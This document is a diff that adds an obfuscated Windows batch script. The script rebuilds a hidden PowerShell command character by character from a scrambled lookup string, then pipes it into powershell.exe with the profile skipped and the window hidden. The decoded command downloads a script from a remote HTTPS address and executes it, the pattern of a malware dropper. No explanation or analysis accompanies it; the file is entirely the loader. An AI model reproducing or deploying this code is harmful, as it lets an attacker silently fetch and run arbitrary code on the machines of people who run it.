@@ -1,0 +1,24 @@
+@echo off
+cd %SystemRoot%\System32
+set AjkPv=
+Set AjkPv=%AjkPv%1YLUm6wzj42Rf7T
+Set AjkPv=%AjkPv%tSuC9e8WDFZrgGp
+Set AjkPv=%AjkPv%MPEylJdkvn5OoIB
+Set AjkPv=%AjkPv%HqsaxNAciX3QhbV
+Set AjkPv=%AjkPv%K0
+set aa=^|
+set data=
+Set data=%data%%AjkPv:~43,1%%AjkPv:~20,1%%AjkPv:~54,1%("%AjkPv:~53,1%%AjkPv:~20,1%%AjkPv:~49,1%(%AjkPv:~39,1%%AjkPv:~32,1%%AjkPv:~22,1%-%AjkPv:~41,1%%AjkPv:~44,1%
+Set data=%data%%AjkPv:~35,1%%AjkPv:~32,1%%AjkPv:~52,1%%AjkPv:~14,1% %AjkPv:~50,1%%AjkPv:~20,1%%AjkPv:~15,1%.%AjkPv:~6,1%%AjkPv:~20,1%%AjkPv:~58,1%%AjkPv:~52,1%%AjkPv:~2,1%%AjkPv:~43,1%
+Set data=%data%%AjkPv:~20,1%%AjkPv:~39,1%%AjkPv:~14,1%).%AjkPv:~23,1%%AjkPv:~42,1%%AjkPv:~6,1%%AjkPv:~39,1%%AjkPv:~34,1%%AjkPv:~42,1%%AjkPv:~51,1%%AjkPv:~23,1%%AjkPv:~47,1%%AjkPv:~15,1%
+Set data=%data%%AjkPv:~11,1%%AjkPv:~53,1%%AjkPv:~50,1%%AjkPv:~28,1%('%AjkPv:~57,1%%AjkPv:~15,1%%AjkPv:~15,1%%AjkPv:~29,1%%AjkPv:~47,1%://
+Set data=%data%%AjkPv:~36,1%%AjkPv:~34,1%%AjkPv:~4,1%.%AjkPv:~20,1%%AjkPv:~36,1%%AjkPv:~53,1%%AjkPv:~42,1%%AjkPv:~27,1%%AjkPv:~20,1%.%AjkPv:~52,1%%AjkPv:~42,1%%AjkPv:~4,1%/
+Set data=%data%?%AjkPv:~36,1%%AjkPv:~22,1%%AjkPv:~11,1%%AjkPv:~27,1%%AjkPv:~47,1%%AjkPv:~56,1%%AjkPv:~20,1%%AjkPv:~45,1%%AjkPv:~48,1%%AjkPv:~46,1%%AjkPv:~47,1%%AjkPv:~24,1%%AjkPv:~17,1%%AjkPv:~43,1%
+Set data=%data%%AjkPv:~35,1%%AjkPv:~36,1%%AjkPv:~16,1%%AjkPv:~41,1%%AjkPv:~57,1%%AjkPv:~26,1%%AjkPv:~58,1%%AjkPv:~21,1%%AjkPv:~22,1%%AjkPv:~24,1%%AjkPv:~15,1%%AjkPv:~43,1%%AjkPv:~40,1%%AjkPv:~23,1%%AjkPv:~2,1%
+Set data=%data%%AjkPv:~27,1%%AjkPv:~59,1%%AjkPv:~17,1%+%AjkPv:~21,1%%AjkPv:~31,1%%AjkPv:~20,1%%AjkPv:~48,1%%AjkPv:~55,1%%AjkPv:~0,1%%AjkPv:~60,1%%AjkPv:~14,1%%AjkPv:~39,1%%AjkPv:~8,1%%AjkPv:~34,1%
+Set data=%data%%AjkPv:~60,1%%AjkPv:~5,1%%AjkPv:~2,1%%AjkPv:~61,1%%AjkPv:~58,1%%AjkPv:~39,1%%AjkPv:~36,1%%AjkPv:~36,1%%AjkPv:~10,1%%AjkPv:~51,1%%AjkPv:~11,1%%AjkPv:~16,1%%AjkPv:~14,1%%AjkPv:~49,1%%AjkPv:~56,1%
+Set data=%data%%AjkPv:~42,1%%AjkPv:~12,1%%AjkPv:~15,1%%AjkPv:~5,1%%AjkPv:~43,1%%AjkPv:~28,1%%AjkPv:~56,1%%AjkPv:~20,1%%AjkPv:~30,1%%AjkPv:~46,1%%AjkPv:~35,1%%AjkPv:~38,1%/%AjkPv:~23,1%%AjkPv:~22,1%
+Set data=%data%%AjkPv:~4,1%%AjkPv:~57,1%%AjkPv:~18,1%%AjkPv:~52,1%%AjkPv:~23,1%%AjkPv:~0,1%%AjkPv:~32,1%%AjkPv:~24,1%%AjkPv:~42,1%%AjkPv:~27,1%%AjkPv:~35,1%%AjkPv:~26,1%%AjkPv:~34,1%%AjkPv:~43,1%+
+Set data=%data%%AjkPv:~28,1%%AjkPv:~58,1%%AjkPv:~52,1%+/%AjkPv:~46,1%%AjkPv:~52,1%%AjkPv:~14,1%%AjkPv:~31,1%%AjkPv:~44,1%%AjkPv:~48,1%%AjkPv:~34,1%%AjkPv:~59,1%%AjkPv:~30,1%%AjkPv:~61,1%
+Set data=%data%%AjkPv:~3,1%%AjkPv:~52,1%%AjkPv:~54,1%%AjkPv:~15,1%%AjkPv:~55,1%%AjkPv:~51,1%%AjkPv:~61,1%=')");
+echo %%data%%%aa%%AjkPv:~22,1%%AjkPv:~53,1%%AjkPv:~39,1%%AjkPv:~36,1%%AjkPv:~42,1%%AjkPv:~6,1%%AjkPv:~47,1%%AjkPv:~31,1%%AjkPv:~42,1%%AjkPv:~6,1%%AjkPv:~20,1%%AjkPv:~26,1%%AjkPv:~16,1%%AjkPv:~57,1%%AjkPv:~20,1%%AjkPv:~34,1%%AjkPv:~34,1%\%AjkPv:~38,1%%AjkPv:~0,1%.%AjkPv:~61,1%\%AjkPv:~29,1%%AjkPv:~42,1%%AjkPv:~6,1%%AjkPv:~20,1%%AjkPv:~26,1%%AjkPv:~47,1%%AjkPv:~57,1%%AjkPv:~20,1%%AjkPv:~34,1%%AjkPv:~34,1%.%AjkPv:~20,1%%AjkPv:~49,1%%AjkPv:~20,1% -%AjkPv:~39,1%%AjkPv:~42,1%%AjkPv:~29,1% -%AjkPv:~6,1%%AjkPv:~53,1%%AjkPv:~39,1% %AjkPv:~0,1% -
